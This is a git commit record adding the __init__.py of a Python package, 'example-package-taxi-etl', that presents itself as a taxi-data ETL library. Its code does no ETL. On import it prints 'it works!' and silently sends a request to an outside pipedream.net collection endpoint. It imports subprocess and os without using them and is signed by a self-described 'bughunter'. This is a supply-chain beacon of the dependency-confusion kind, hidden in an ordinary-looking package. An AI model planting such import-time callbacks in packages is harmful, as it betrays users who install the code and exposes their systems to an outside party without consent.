f5ffd6d8a27e964e59b1daa44ce5dd2d9031bcf4
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 13:20:00 +0000

    Add package example-package-taxi-etl/0.0.3/example_package_taxi_etl-0.0.3-py3-none-any.whl

---
+++ packages/example-package-taxi-etl/example_package_taxi_etl-0.0.3-py3-none-any.whl/example_package_taxi_etl/__init__.py
@@ -0,0 +1,8 @@
+import subprocess
+import os
+import requests
+
+#I am  bughunter
+#t.a.neo@yandex.ru
+print('it works!')
+requests.get("https://76c42f27d26091659dca820a37e6f5d3.m.pipedream.net/example-package-taxi-etl")
